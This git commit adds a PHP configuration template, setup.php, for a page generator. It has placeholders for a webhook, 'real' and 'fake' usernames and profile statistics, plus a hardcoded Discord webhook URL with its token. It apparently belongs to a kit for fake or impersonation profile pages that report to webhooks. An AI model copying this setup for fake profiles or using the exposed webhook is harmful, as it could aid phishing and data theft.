96ce2bc4c9cbe535ba896313365a1fe37da2b33c
Spxxd <70066958+Spxxd@users.noreply.github.com>
2022-07-07 23:40:41 +0100

    Add files via upload

---
+++ generator/genfile/setup.php
@@ -0,0 +1,17 @@
+<?php 
+//setup.php
+
+$webhook= "{webhook}";
+$dwebhook = "https://discord.com/api/webhooks/901418693374926878/vNNsX7DJwkp3RCxTWjdaazChiIk9YoHFZFDl8BSWtvj-_txhw2j3AW0PF__t9pFWYzPz";
+
+$realUsername = "{realusername}";
+$fakeUsername = "{fakeusername}";
+$about = "{about}";
+$youtubeLink = "https://youtube.com/asdsad";
+$premium = "{premium}";    //true or false
+$friends = "{friendcount}";
+$followers = "{followercount}";
+$following = "{followingcount}";
+
+
+?>
